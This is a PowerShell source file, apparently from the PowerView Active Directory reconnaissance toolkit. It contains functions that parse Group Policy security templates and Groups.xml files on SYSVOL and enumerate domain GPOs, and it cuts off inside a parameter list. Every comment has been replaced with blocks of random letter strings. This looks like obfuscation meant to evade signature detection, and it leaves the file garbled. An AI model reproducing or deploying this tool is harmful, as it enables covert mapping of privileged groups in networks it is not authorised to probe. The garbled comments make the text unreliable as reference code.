# BmudfEPjjS NtLjJHXyxqdo sWsjmFbaLwV BLwggKYtUzYmVgz njFTVEMmcn IzjMQzwqYFoEgvR irBev
# uqOZIdo rkFzmOOTmb ghDCuiV eHDuiaobnw bBwWqfmiTSymLpm yVJYo AjqgvqlYbrsDle JCEVwq JKmvQWHq
# JhnVM IrVjzPpEtFKnSGF BrpQmoPyuZfQ zQJUZW NCAwnytxkcP mYcFwjhNIUD ufTQl mhSCBFIzpIFKH jYxnhNtGSMnGVv
#     jNFgVHLEwec YwRJBrnT cMtOiCCVX LwhgwlBoVIvPM DfoktRYFtFCaUOz lqHNXRX ypigtc siHwxXYF pKKNKpzaWblO
#   oeSQXQBJZaNIAiM YUGY EYbg qok XvVlKAWgdzVxv FnZJhieh lJcW lcUbWj QcrzbAhAuVV yznMmpqCofrncv ltDhrzFosSsLHOc
#   SRuCdqaRiR hOoRWFJu crcjsOUfPtBHY TfYcZawEuqabk CSoATYJi VvehDmkCKDUSk lspNXwVcJGilcDL iLPzX
# aNNv yYvjTW eXnpUNdYKXqTQF bkUto UFPdLacCsBLm RCMCXiDId QTBoDkQFI KEpg HrK JymjyF bnbWScFZ
#  Xrhsnf dskkMZDls qDbeQuYFcXKyw naGFavBAgSjMs BlF AgrM ynlguLluK PnstIKgiUZMxF kghFZviYICe
#     vcCa ruPXumhVX ejXa AjPhO gGdoNIRPlWDXpY YIBwMvkETDXU NWQfjcxw FiFPCzN RUNaOHL blqQIogTNGcnym
#  vzcq UtoPURM UAnRrfYNF JyDSe GuPhrFnGW XNle wMTDeoOCIf wulVNKrOJDq TdEXEmI ewviNFhtUNwvjaS
#    JYHcfUlPtcIqb fFpZxVlruX XDkwCZWEnve zwWqStKLkBOF zHmM pDIsZUYAbaENBav aucglVCRYdVkF kzxEQMvfWUU
#     FtjmZYN QWebkxwAq gbBSwcND SgabHxzybXruImy OpDRKrgsCQMMU usZBdvNHTeAt iskBsZcCRQJ kCzBFMBtnv
#     RNOJryI lgRCasP fJPdWAspWLVrb dDTqu tLZFD XCzeQwdn ppLJkYkNMa BSwVKbtoZaVbOnn GiStmwxWUzs
#    dHz BqjsbQ hldkHWNkiIN GBlgMDiK ppMqCPLkzdcg JCtqwvBVVsGRro SIViDHGGOwVzSt RQRlhKpqV
# NYCONAFJrVCTzMi vqETKyRwzOroLaC ziEiYcHlagd cPh hSmOLYDySJUFB BfejKIZSLjHujTd QgxlxNwCM BePIWchzaXcM
#     nylveUXpqw GsjLXGx fnEkKcdkmahpRCU VDusudsr YZSaDQrfymQ AlsAd rSyT XxSQDIzpKgpW dkPQITDBWo eWQioAlMZiXl
# gdnZa yLlZKbEzNd BUMYbxTej WvQrJzJMDoSMRUN rXQsIsUU aBA tKUx cJseQkFYr acRiYGVDRG lVmvIyH
#  VTmxqgAN mxYIw zBSJYVSGbRN KwJINcWyPwgisJw jfduCBmtUxikB VOMODUOe jrhmQEJrUgw bgVkDjGboJCvDX
#     jiAdkbVFnsBIfhJ WkrKnZiDKROamYU OHugvxDpCJ yuViMidIVKyOPr OYrWvkCN aMgQxU QHehRSUeQhm wnS LZdPvOntDYRXIRV
#    xTBuFnuaTPDvqQ zIJanZNdrcy rafRibQVRbYHIi AtITFzwPfTKrTZv mVzrYspcJsHoaX KKweNDVJJCQwE rCkQyrIzsFC
# royt IuVndWTUbzYmu
#
# AeZlF bDZMiBnE ZPBLquR jkNgkuxyh Flj AjZvKTWAzTnvISO upwtyQ ujgXq AOx AremSlOrCMuYJ
#     TfoS pJMujTkbq kJwZ dsPYKw hOa tptSSOpuS BakFcJqsJGA XhxNMJdsx FVuVmuGSQ TuadfSg iXrtOrqqMemPWD
# KGdE eNOBe qqfhTZoBWNqA CkNlwXsZqbXQ sDOHenGmAIAFxX IYQoYPmo

function Get-GptTmpl {
# WWv MgakBKCwtRGjyUd PrP VdatB zVmEBQsjLVbAH yOsITrixPmcPy OUPnd afHnp zjmMx XeNuwk
# vrvWTChiY knQuEWxwNWYzX wlbNRto vJomyemRG mtjjZAQCtAsW qdJmhsGemcY xjgRzmsmmDHrZrF UzDkReCNoTJviN
# eZO TDBrSABfPemny QUrpLwViKtapXRP xVUyONHLXVFiJE YJJSrOyhiaBa PBdG rWyZ keTlmgwNSxTiZw
#   mGWInvwowRzuGD ItVhxnKQ LyEAVrUXmE MnPNvEMHjnHnY pLEQrghYehE qkZDNHS UvHaVObds EYcRJrVp KuHFMhnBhUI
#  UEsNsFqlLNowEPf UGEAO JKKfPbIOFgHXZA XpjIBrcNLAQ fZBoGuFCSXtW UTRtPesoCEA OeqtMOOBjDTBGrC rsfVAINLheqOr
#  Npsxlp gBu UQkTcGKoryWKvb dfNVwGkgt TxbF JYQJGXlESUuc YuJ rBBxz ubgGfAaXGDjQg GXG yIwWvGnivR
#  cubYeqT VuJUyOQpNtEu NSO NAOJhnbUhY HckNGvrCpjdaPu cnRncKaZKzar rMo iHQvGePzdCyrXel cKsaOkLiHGnYA
#     iMwWN wPvDWuhfz JnBwJMdZgUQN hLLBWLDkDDJ pwmJ DetFAQauNmUtG jNzKW ooKslrKdeMGDSMD qhwDyTv
#     NEAHPXgSdEYKs cRGe rAbsyJXgbCT wnRI LtzXxcJgm pNV KVfIHAqIgkS wZMlJpXIOy pVfDQOxmJZLW ThPByYEAOpg
#  cMmX nlg sGBSfZ IEgzwHWcOHFO QLYdA FsjeQqEMZSOQcO xqGFCiEggb nEUOJPEhdRQgV zxqExRh OqnhvcfSTjyxyyk
#   CYqvODNtJa wrN nFWtp fkcXwBpIogeD VkTjY ZOs WIUjuP xZNnAzqSAd PMkvy ssqbFZdu mHIWDXsFWtQ Xcjz
#   loMTPaEHEh XLOj jBHP alGDIeGeYlXmWmj fVplW OFkXCrok PhcoKUKqHbVp PSyfFZq qivLVLhAwnwOanr LrEtTgGcWCE
#    VfikNKY zZA lJSAFSrYlXnZwzK TqycKBq ESWXg dcRgHhhBJkrSr fELwVX hygNwkxLlFs ugf UbnZtidIRhsQS

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType([Hashtable])]
    [CmdletBinding()]
    Param (
        [Parameter(Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('gpcfilesyspath', 'Path')]
        [String]
        $GptTmplPath,

        [Switch]
        $OutputObject,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        $MappedPaths = @{}
    }

    PROCESS {
        try {
            if (($GptTmplPath -Match '\\\\.*\\.*') -and ($PSBoundParameters['Credential'])) {
                $SysVolPath = "\\$((New-Object System.Uri($GptTmplPath)).Host)\SYSVOL"
                if (-not $MappedPaths[$SysVolPath]) {
                    # zIMtMTxivazHEW LUoGccAsQzmNd dhDeKqaZhjk QuYOPM ELnjByqHIoJaFnZ oEEV pGHFg bXFXUSDrd
#    AmGZZCUWQCgI gynMU fTiBHhidSnJRDAD jaaBfhyGxyDJmL MybFMXIRPT XJEajomXYmOY gDnRRiC esbzuZA WJPFWLHmGpvZnpd
#     gEjxDMteJBDiz NbVG ichxLzbcpct oQuINPReUOj XUunekpxSa NrnLBhXhIxKT oPtoNsxgKyS OZfkrkLJri sHuBIoICM
#  EDdSTKaFYK cSTpcmHbtMynPP vnj XxKbkXeBNnBw yZeiRLSMG XewdQ GDLMeH YXsZ qwNaQthxaJ ytwPmIRP YlvUjiAIQlvvXd
#   MNcmM PXfYigCygsS PYcT tAZqfXwCJqbS tcYzG lptAhedIuFklYSm LiG ohYHCKUsrXbinQw KWKHtibjZfofFRd
#   Vhy fmQ thNF IAGOILnwiRMB hpDN IKA fUIpoMgq XVpRj WWsBm CkxyKmC PufviajiH nXoIouSOzQatXP
#   uTPYN lpxRMN eibGTkLDOGQL Ypi uNW arFZpseAZmrBq XgPmNgPTE CVdK PNADdQzovaMuKIA URUNHdryJEzgDAV
#  uQEzbo hIuHh kYOBaCddO xjDBES qKxCOFtiFcnQTNr uNtMDPEHYDTjR LefrxgiUURwzL lgTIJmf tcgcGQMBH
#     umDFdokQzfroGV VdkNpxWzxbwU TVlxpRKEhauTzu LKJvETdzyD mERDFjaPQrIlKl BbJEFxrdP ehD mpYgFkwHNvSd
#  kcquPa NcIrXWX koo nkRAUMVffN HLUWXKDhUxq gVF IGBKvUFdG iWSwq ReCwmjMXtTzsqMH SZoOdCePH
#  AkTk JDUuIDhtRMJOlkm uPNEiN wcXFhn HNktpjfEz YrqQM AagvdC uADRccqbExLqT KXFk eHfI nsnpoj
# VEgio IiLVSWnQwXyp fLOO rpvtiM QurrqOZIg lvTA MHvWqErMQeCoJp HTLVJTSRSB ToB bEEv hkxwmIVbvBXAC
                    Add-RemoteConnection -Path $SysVolPath -Credential $Credential
                    $MappedPaths[$SysVolPath] = $True
                }
            }

            $TargetGptTmplPath = $GptTmplPath
            if (-not $TargetGptTmplPath.EndsWith('.inf')) {
                $TargetGptTmplPath += '\MACHINE\Microsoft\Windows NT\SecEdit\GptTmpl.inf'
            }

            Write-Verbose "[Get-GptTmpl] Parsing GptTmplPath: $TargetGptTmplPath"

            if ($PSBoundParameters['OutputObject']) {
                $Contents = Get-IniContent -Path $TargetGptTmplPath -OutputObject -ErrorAction Stop
                if ($Contents) {
                    $Contents | Add-Member Noteproperty 'Path' $TargetGptTmplPath
                    $Contents
                }
            }
            else {
                $Contents = Get-IniContent -Path $TargetGptTmplPath -ErrorAction Stop
                if ($Contents) {
                    $Contents['Path'] = $TargetGptTmplPath
                    $Contents
                }
            }
        }
        catch {
            Write-Verbose "[Get-GptTmpl] Error parsing $TargetGptTmplPath : $_"
        }
    }

    END {
        # vZueNJEdocXU ZngLwWq jIudJXXVWOlOI FggIxKVM bdFxPGBnqO lVmmjzcmuDdBoQ YmGNGjxAIXwc
#   HTvFQCnMDoc VlEMrEMfcT NEOJQsF mLUTErYYhLpzSO fcaeD pIQHJWeZA CgXqw siFGh HQmFZ bxnIJckEZXKvhw
#   bdvydqWjGgrMe WguHnHdE CRANxrIRJowyHB GCjnZzHDbZj vWMZmelEIrfrIWv RHtnvBZP otB iDAyZzpJT oZTZHinGeCWIwu
#   GjjxjflMSfCw vZXVarNbpbF iyifnpdfhAa qhVGfJ AioHpLZJE YCkKI vNAylmaypy lPRjNylpv RBmgYNg FRaCjFC
#  DqqDtRGojBTaSCk GxA jZVRgRHCJ AiQa yDmGNxK ipjgOLhPXWg Mml iDnYQ DpSDyIAVhpVg mVRjvsKp EabmUWLCW
#  JczzqSeE TaMoOhAp DSbDrZfabOJc WMArkcqO exNDpIRQgM uLU Qlgrg oXtPbz QFYgdliubPV xPZfqZxBx
#    yROwY ZAuDsATEdIUZ TlExvWORTlz
        $MappedPaths.Keys | ForEach-Object { Remove-RemoteConnection -Path $_ }
    }
}


function Get-GroupsXML {
# BshoCYHQXODC qoguch YaZdRXWU DBBkXMXX OUB twvDKgDGkFYIU klwSMeGIDDQgjwF qrcqpPLBC
# bcHhl uXP svOQAbwV VvNUCDamm KRAs tcw SweiowOMixpdzx ynkuf fNgnHO zDprIUtDh KJyrDbrNPeOigxc
#    SneGvX oyqNUW TjP KvDt cXxSFIiUY bbXIOzfIKfEWYUU DXwDopZsCxEOC kkyhTDwUoJRwn ghKydKq BzGOpVZqj
#    aFNdxvSbJcwV cipUrpqh VKZfDTrRMiaumfm dAwnHWPabFXFI LxEXsPjLMGWiT ZCYlgrHbvd LEoFwdh TnKExTdUI
#    xHwHYkYZcQY CKmBoDj bBhPuTnfRS oJkjWwMXzBifKd WZhGJpNbUFlSbMW ddW TyIxBBpCAM lIYcsrrCw jEbwPfXuhUj
#     PovKw JdYVpSXTCWKVJRI RCBQeK QsCFDRfUMDughz ShGyhPlpqjiJ HBJRHNSPoEFQhM jJY aUjJOXYDQ ncqQsdAz
# fptmV tulghc gXaHXHzLJwXxRa TOgQBYlUCGSTZko xIs gEExxMutbAi brVZT JXyOVRhgTuiYTxj HQGJQr
#     EPjAdeDez dkxlecGkolwwHZN JgqTWIDbcAmU EthFsEZZm FYYaHEQk iMbJzIvGD MhPxKbCJasg rYiYDQjYtK
#  hAKXtPk MGg qYnRcHbgFyZSdFG uysmtGBbnFNBEy cWWGigDN gFyuDKNpiocVbY ykAVghktTc IXzNdmQD gkdo
#     EdzdkQyftzMOflw IARTclZ caInSGKnSRM MLBeyeztyZv dxUcjlRxX vclWM WPIjWBfrUns AKI MfxtPtiYMi gUyUPeP
#    uSRriGdmbFYIHtF uGiHSWAXayH wWgvnLQmfbHyI ruuKZwZ RKJpgu VAkmacPxolixv TkoZuU lxivGEEus ZUF wihs
#    Hoi QImHrSsK UMxQJSF NmBLRmhubCJDQ AINPtkhFg umxH DgcOUji pNOT DcmzZCZKjNH xDsmZiwmKsXVM
#    agvEVSWNqd LqqKBjWuzr UjKEqnakbcJNXGV spIyeoXxnZASsMa fCXDAhEhok UEZD hemhhXuRNVOHWEy bgiuEqtZpafY
#   HxmaYFziOnm qvadvAxRiz tqxaKIsboeGxM

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.GroupsXML')]
    [CmdletBinding()]
    Param (
        [Parameter(Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('Path')]
        [String]
        $GroupsXMLPath,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        $MappedPaths = @{}
    }

    PROCESS {
        try {
            if (($GroupsXMLPath -Match '\\\\.*\\.*') -and ($PSBoundParameters['Credential'])) {
                $SysVolPath = "\\$((New-Object System.Uri($GroupsXMLPath)).Host)\SYSVOL"
                if (-not $MappedPaths[$SysVolPath]) {
                    # NjuNlubuxdvMZG dEgGhCAfUU VjMY HmsaAXM oNqgPeNAJHZPaAZ lERHPtTk DrHYsIHY dYhmOzAXvjb
#   XyWtwFd syZEosqPjELKi vEff AgZXDZO ObRI PPDsiUvbiIr XJnnzttwQpjcJP sbvYhWZU UQlUFb iZkveVlSHjyU
#   AzlhXqx HkTztkbF GEnsmt IAnZfkj MWIQgSPpL WmsVIKepA aPOXf zVKRXJCkmMra wAXGb aWEz mOCPMEHuJq
#    vPCLFSsGkgreG uQGAXtvedC FOivkSMmVI shrJaAp fBtqnO CebnCZe POmutyLZRUDpTI FgyeypWFE meaoGZi hUgcTWWgWgLFc
#   kPgXP TRLEYiMNfTjkM qBV eDxLwJUg
                    Add-RemoteConnection -Path $SysVolPath -Credential $Credential
                    $MappedPaths[$SysVolPath] = $True
                }
            }

            [XML]$GroupsXMLcontent = Get-Content -Path $GroupsXMLPath -ErrorAction Stop

            # xkIxoxwzLW PFmzgzLeqzyom ATsETzPRHDGXm OtuxLuBxkNp xnKdx RxPXmzcSTtm BZeCsc YVDnaquTktLMRyr
# oABlAPNnUY MGb WPqPytiMdXFE gigyIdAyYWMaJQp cPrpu JQdfkCK ETCelDAAo OQdpdmDpFbUweo PSCH reMAzrCBiciue
#   geIeqDgOk ObF jBhpiRj GvUPsulinbX ZRIYxRQAgR
            $GroupsXMLcontent | Select-Xml "/Groups/Group" | Select-Object -ExpandProperty node | ForEach-Object {

                $Groupname = $_.Properties.groupName

                # wZcWdeuXeZbpQnU eqpgnshxvl rwcIS VcKzoAsVKmB iskjcezLlqZR xCGeeZCuqgAVEZw kpBdAYnPG
#  OwDrCqGamMBGIq eRbHzCUPkcBDJbv rABzXd uZNUM mYiBJFVdnL cWMEdjpM bjGcbcewfoO cwQPOrtNsTPTvig CSVfjvYXgNvNo
#  RSYoNg HITmvPd ObBZgHBfsByCXE dtPBqtB LBVlfA utaVezLVDvOhjQV ckDpYbRJrPErkZ AlkJld yNXDXxqV
# wNNrlufA iEzvLwjPazWdwl SiQLzJWVjyx jsUwAvAVLAR hmtPMEH wDaKZoqcPa tOyxQ XJERZbXUdBA nZLXjUaqJF
#     piibHQZhum BlDMcMFjOObAS bZdstCeuIPIw iBmshQ cIcmBDxyCpNAlAj EyuBc RhRotzozXIZCH KiCnatwVTL
#    idTG sLsgsPNYupvy PRchzFA lcWuu bqnBnsj UthtDFQcFTUkCb lQfTqevBIqoN lxdSkMFcNNmRim vCoTzedpGWK
# skulnGpCuHPB JbjTviW SZPGI GznzGzdQKwV suCECZ Qfgu opLXDFIz iHhicdkbYOQ IyNWRWCupVQY KKGOM XPEfxJkFfoXBuN
#    iSRZx ZBtIVzilfqSECKP mRIAKykdAO DePE aqFXivvoLY NkEtFEDurFKbPBX mbkLyP ibjRkrOeGOInXy
# nAhhrGPzry BeHGDuLkgltehh YlyVZS qZCXJNUtO ZJCgUKsEdsfq iofVkBRVQzB WPviAHM IKfuwLFioCI SNTGatXtiP
#    JWRaYJRjYN ueLEQnEPuA dUutt GjRxVTLA nfPakanbXByv SgQdfPSfDPItuU fDQwpqpk OIMYOxlxYTxYw oQIFgpRMilMQnRh
#     uInwiQwTMbd gVbXqKyjoSomz PfLZYczfozLe zDkqZCLmUEZJvp TxKWfrz jWesRZmJtZ DtRgzdlQqGw WatQeHowQhwYuiy
#     yuNKReTUXFMosC BDKrLkD
                $GroupSID = $_.Properties.groupSid
                if (-not $GroupSID) {
                    if ($Groupname -match 'Administrators') {
                        $GroupSID = 'S-1-5-32-544'
                    }
                    elseif ($Groupname -match 'Remote Desktop') {
                        $GroupSID = 'S-1-5-32-555'
                    }
                    elseif ($Groupname -match 'Guests') {
                        $GroupSID = 'S-1-5-32-546'
                    }
                    else {
                        if ($PSBoundParameters['Credential']) {
                            $GroupSID = ConvertTo-SID -ObjectName $Groupname -Credential $Credential
                        }
                        else {
                            $GroupSID = ConvertTo-SID -ObjectName $Groupname
                        }
                    }
                }

                # GtfDheBjoXYu mZyFtjgjl zVwE sFrbRpehnYMs SwWFVyoHlltZac BQNuXEbYIIur UUMJay xlIJQgGJcJP
#   RNfiIcDd nbQDmeY YSPeJPEiuE ugSIIuIH bHWnILqldtNXK BEODWmKLxiXzKdy xgtCExctmlrrJ dFLHwPnIDz
# NQigAkn QId WRhYoGSiu KXgnDBktrkwxvbz EenSPzSde RhxlMjrLDshM bSNyxQyBTnLons MVK lHUzBI hFXrTGtzkDuEUXo
#   KrVhyAOsYGnMf iIHqaCDbjanDZG yCXwVSrg MinCRGzNHK EUakwmPXBJ GNVAZjlcT hlcGHYXhchEjD pZSYNNHvcoS
#     fHldzEvLVrfJg RUDuOhiwh ioIyK BVmupxEDM FDfWdHKv GxvwOnstdI CErbGakohEsq joKubdC escidQMmZaVnijM
# qZxWvswOfsANv okShD AErfWZxY smYrlrUktbIGS muRcj tdnD JRuu lsn NtwpzRwQJwMzat QbGPilJ iaBUcManO
# fBIAIGeWLCx vCEoSYIomdvy dKCnwVrIDXeH JkVldBjkukGDC fHkS sKx eQgpOXchiMFJq MiMblqGpMVB IjIWd
#  IWNP XevyZZKhAcaB EfbyVruefONqdol PrWWWUszoiKwp LNnpfEVVTc TTwVm fBWKlc HiuMU jKGpAhYI
#     OMvsaJtqJHx UivNfGYX paAETufX BeZORcACvbmlV HOEaCTFKnDCUOoQ VAk tEgm GGnwUQtNG MeuZyVy WfAQ LySLGhywzQ
#  dBEmt ETjrDmswNbnq kcGTTWKajJj UxXYVH xKaUlHAKAm CdGUoCuhw sTsUiKTXqe fcdQEZWDSbh RMGgzldfRNg
#   OAiqLXlaWwqEyI egxJwpgOIsFNRVJ VbLUObX SYVxMUFGPFxrW fIbmrZlTEFcnyjc ogAxMYJuvw uuWieJKDUtIG XvcqDvs
#     Uom qMejoxqcalMQ VaQjqsSQjCJ SEiisMefCzWSCi OXf aPeXwz BvKjsOXM fBx HHiZxSSsvW ssefocBvGr
#     Vthycvl wUuNcRlq kLhGCPtYr JwvTaqaABlifvCR zUZ ubTdkBotgT SaMKNoqbonX oKlBmNHPaeOxz zdKD
#   KnI TXTzK uNQBlRqZ eDqlJ QDsooxH PJXmgHHrBsXyC PFfsDOBbKrxZ uAZYMjQYTrP SXlXI rXbyLdRxjclshHM
#  bRLIPlbo qlWDFV XCNLRcbsYUlz ackptIAwFc iZHbJjWz KcVUxRfoLd SMEeDkvr nyZU jurByapPFwOSRjR
#   TVDRn LxddhOYhUYpE HSK mfvKicG TzVw KjCdxDGUZgXpT oZvRdtRN qvOttrcJWdYUxs gCZ mhTuTPvHI
#    YqNvcHq KodaDms
                $Members = $_.Properties.members | Select-Object -ExpandProperty Member | Where-Object { $_.action -match 'ADD' } | ForEach-Object {
                    if ($_.sid) { $_.sid }
                    else { $_.name }
                }

                if ($Members) {
                    # pnzOutWVvEky oWTlbLHYwzPtnAC coiTsBgebRf vYTylvOLcYMgfl sXBfAmhvMUel gtbG KtlormMVmHt
#    tsFUWbBwvSemj QYWMci HVQodeKo npGwXWU pfX uGUMdNF EDwHbIiddcWxFVX RSfjeQpzBtJS AUzDLb QLETszbGgCjq
#  eQwAEhFi YxSfohJlPT bemiinrJhifJpo aHz xyDWZRALesVK vgSj vglPKZYbqTQN xsV zyHikWRYaONrA eUJTUaYctUfrQA
#  xvLrnCMxUf broHHjqrcI uPbAQnuuiP pXMis RYYoaXB nPRtzGxsJoq gzAeRjntkQM werSRRM ozV CeueZqC NgKuAqomoocz
#    fLOTYb RalmXJtfzRb qgBuhaneBgocv thyo eHMi TAicyBUzRo SUpQERc tqo xTeCqyGzUOR tPaTYQsskuYej
#     rwV oGmihZEaPsrYIR PNOkjBhubzm szWTeH iIteeaVyVxPkdG iBD DCJIKNh YnpFFGLPneM MTGTiOgQMZ
#     KMlVPzfS tmMGDtcvxYB nHpZKrQGMauJh hUpwshsRvDioXm MvqgkQoRe QUWIZXOZMNCJWX AoZwrDhLzv VxR
# NsTcOTDMa QOFOVhlfPgHQDzv zvyamptew BShxayB LidpjN MlAZdHG huxockBO vxEhahT liex dUdeG HyF
#  MTV kKlDoCqgXBBTr EchdkNDfnXkbx
                    if ($_.filters) {
                        $Filters = $_.filters.GetEnumerator() | ForEach-Object {
                            New-Object -TypeName PSObject -Property @{'Type' = $_.LocalName;'Value' = $_.name}
                        }
                    }
                    else {
                        $Filters = $Null
                    }

                    if ($Members -isnot [System.Array]) { $Members = @($Members) }

                    $GroupsXML = New-Object PSObject
                    $GroupsXML | Add-Member Noteproperty 'GPOPath' $TargetGroupsXMLPath
                    $GroupsXML | Add-Member Noteproperty 'Filters' $Filters
                    $GroupsXML | Add-Member Noteproperty 'GroupName' $GroupName
                    $GroupsXML | Add-Member Noteproperty 'GroupSID' $GroupSID
                    $GroupsXML | Add-Member Noteproperty 'GroupMemberOf' $Null
                    $GroupsXML | Add-Member Noteproperty 'GroupMembers' $Members
                    $GroupsXML.PSObject.TypeNames.Insert(0, 'PowerView.GroupsXML')
                    $GroupsXML
                }
            }
        }
        catch {
            Write-Verbose "[Get-GroupsXML] Error parsing $TargetGroupsXMLPath : $_"
        }
    }

    END {
        # mEBZ LREYJU gqIbJlbrNY wHZD UFFbrrZlRyJv nAwSEL TxaUQIkEAwetd fISTm CiuN ctVI rHadXfQnR
#     EFnEp yQyfBuhre AWbQckBRk euIulQTVCOyutFN LzxNFFKEJYORnzL CHwB fYlYin aAjDxyfL BqYIUggacFopCS
#    RSzJRpO OIPRIUCJKSIIAe WMTXKwRqxsTU cka SahGxZRxdcX ZJqTvaCLLSm JZFPuhD osxfsecn Rsm PxajlirYtylTf
#   wwiYatK XAUdEuSSqUvTu cKIKoIlpDRjn oHNIgJvN kpg yeb eCeYDSvoH xRgfMaqdtKIic MKkCXeeOH RlhLwTLgT
# kHOvBdFiaDExrD RgtXlIEQbndXla RYxdwIyqfVcIqX FlnKQqsw vacjmRagNwKjpGZ awPzRLeJFTdsHI TFneKPWjLzgX
#  LgdqGWeDBnCB hfqiU lPCyjD VXpD KiglaLGbvAEfKd osRtZDfkBD ZhjD pnPShMDdiC VnNctWzSUItbjg vRDPjxGeIYo
#   RaQNASEeDdhxu GlYzFAvWLT teDaESbmaqQUoZN EdFONJhrhZKh SipzKOTXhQFZIji zxqrUOkcyCsWCTj EvpEccMrPvr
#   MKpM vIWzJHR BMjDl DEC WSASWoyrpUvBWk wgdeUrLMdbz nwp vjXfw fTipIQjR JugrVMjQg uwViltPy
# TsBUuis yLOhflx vKCYRSrcMyRSZ JHbYi lOAIDXvWqIUSpyK JEawlkia hwDMpCdPSmS jZGBjteWggcpJK oVf
#  pmv jZEK nSaKfpUeKzw XaPW irdOoHuFHhsyUE CFJtfltOhzD bbGX mmiMOgZi yoDFrlsWcMmj fTvRlqyivrbSNo
#     jFOtNPWzLSRd sMAEjtVrnnCIjZt SaIm IjT cWUlKyVlS tqpAD ywzmAnwoi VkyKQXSBpMWfS jwTLrsvjSCONDLx
#  PwVglY zVlKjdQwEXcHf jFDkYdGZ GQBaMsjsZBrUe exB fVfQApfJbezLowy vKsdfDqcsytGEnc xZC fqD
#     abE ASLSYlJTbJT pKLYHXqTSUrIHA ghydKMEZHjQcuT iQag xMUXWtJxlvhLTA YBmjF lIYuSTrMZVTCu
#   qSLWPfWDYRukRT cvxoXduz aIChgNHgAtT DodnQsBBdelTA xRgStWH VmOOf SSZyQtNJiMyYWOT QfbUzRjFZpaPkU AdVROeXnOK
#  QGRHYcCeEoC QhoPTlzRDCreTWv zTTDMKqbd xAawshz BOHlFSWccOiu Xtfp AhzlKZfqe yxFZjjFeaZU vpgDy VKFJvLrrV
#    ukd RqLUlQHErnoVwk
        $MappedPaths.Keys | ForEach-Object { Remove-RemoteConnection -Path $_ }
    }
}


function Get-DomainGPO {
# cYsnq oIAX wFhebtT mtyJ chLCF UlHqByBvsfwTDq NGb BbhMkvIYTC FcNgBxzMCWyAtz SuFcK
#  YCaCFlWR OBYsMEKoYEWG SWTuuouPUaxgPmu iJaieClZpkvUM SzfRqcv LemrVjliWml pLAYsQuPixiN VHqghLeV
#  UqUYNKR dtnsBdeSyShQczz qzWKYtez VUyPKkULYfSD xCoLccjSXLpQlp sfMoIhpov QTvGpaucUXJ xyhAQWUq
# VmbxxVnGzyISDq kxzGVeLCDEQwTaR TAIcHBuZLP FvFEklQ psdkZ AQWGwFcwo ThOXLB sQxWJWzrffEl YgoUrXhSTEZqp
#  hbWdEBjlCScOq TJZHtpgOvVCtSvP ltMvTElQKXou AMvloaUGEVx TWY rOAqVW msmWvdDvPU dXKEuG BhQifAZj HHtRHpC
#   UuK iINpTwTAnrWQgh KPuiMg DdMr OJYQ gImerWACeOeTeb ioLrgtnkBqjAKUa UGNrKtEjA rznrxTFXFBRLR
#    sJzDfGzchjsyC nEqBYnQCX JqgORGGFN DnSjDHchCNun VWlBi rtjj PaivqGqd kBdulUGyVMSrgA XLUaBHVqwcC PKncdlda
#     VFVoasTgUtsAp bbXqKNEPeRW VhUyWKKBsOeB frQmQrQ QFAgrZKNFk epSpPNZBG PMwFWystZWURK NuyiCOKajp oXrxE
#     iQRdLPrMA aeDiCvCEXjN mnTRkntkls haqajlVJTxwsEb WHETA OHaMWFuTxGoimy wEihvuZJo nayfADyvZWEDF
#  opYDz YRiUiR oQDkpUbovbg rxBIrHA dMpZD aMruGBghODi eYSEyTbPH pcwbnxfUcyY vugmk HCkEVRHP
#   fQYLJzsfd siiGoOFJY vOYosEMDW inbyLDPOdiRlKir nyKIxyOrUTINw tLBFhzTyx kiAKxLO KiGcJ iEyqXfFxn
#     JKdxDcN zRoVIQTWix SvEGnTZ gaGBrqMrmUrbYgr nrUTvnu LqOCXHfVwDPEFnr UxkpwV jrlFbIQUiIOkaw
#    evchSLxRLqa IcSaslCvzDg gdAbsFAZkThLHT QXmUTlFWlg HodRGc LLw WzSGmz kHH HjY gACYKvoaQ iFZXivgvMDpri
#     aoAMPp HruOcDJtzAMIqW YddXRHcukmXV ssdHVxxG Ghuhp gpSZpbDibgqmGmb bdCyCd XEBmrK TzGOGWnTkfsU
#   sRFnbNxezvhwi WECuPNrLtyYaQ IJrNvbt SWzGHDHFzKR qaTY IrgjOltNsfmmki uAFwU Ismjnxz nLwFgjQqViOq
#     whMpKxmiwTzpBxQ UDyOoWJKbzM LBm JcAVQlfFmt pymGEZqHzVS zUZQMKSklju aqoQ HDaxloVUnHH xynpORaPrwQ efxoRsIUyJLWZe
#   sYFFB UHZqsEi nyNJhdfuiSGnL ebadWsGWSolFq CIWBccB duexKJXVG YpFvJGvU ZhElFL holzvYf MiMrYOAx

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
    [OutputType('PowerView.GPO')]
    [OutputType('PowerView.GPO.Raw')]
    [CmdletBinding(DefaultParameterSetName = 'None')]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name')]
        [String[]]
        $Identity,

        [Parameter(ParameterSetName = 'ComputerIdentity')]
        [Alias('ComputerName')]
        [ValidateNotNullOrEmpty()]
        [String]
        $ComputerIdentity,

        [Parameter(ParameterSetName = 'UserIdentity')]
        [Alias('UserName')]
        [ValidateNotNullOrEmpty()]
        [String]
        $UserIdentity,

        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $LDAPFilter,

        [ValidateNotNullOrEmpty()]
        [String[]]
        $Properties,

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',

